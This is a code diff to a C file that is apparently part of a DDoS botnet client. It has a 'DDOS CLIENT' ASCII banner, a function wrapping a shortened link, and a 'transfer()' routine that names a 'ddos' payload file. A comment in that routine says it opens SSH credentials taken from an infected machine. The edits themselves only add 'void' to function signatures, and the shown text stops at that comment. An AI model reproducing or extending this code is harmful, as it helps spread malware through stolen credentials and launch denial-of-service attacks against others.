@@ -11,7 +11,7 @@
 typedef struct addrinfo addrinfo;
 
 //print menu
-void displayTextArt() {
+void displayTextArt(void) {
     printf(R"EOF(
 
 ▓█████▄ ▓█████▄  ▒█████    ██████     ▄████▄   ██▓     ██▓▓█████  ███▄    █ ▄▄▄█████▓
@@ -30,12 +30,12 @@ void displayTextArt() {
 )EOF");
 }
 
-size_t special_secret_link() {
+size_t special_secret_link(void) {
     const char *link = "https://rb.gy/o411hk";
     return strlen(link);
 }
 
-void transfer() {
+void transfer(void) {
     const char *client_file_name = "ddos"; //path to the ddos file
 
     //open file with ssh credentials from infected machine 
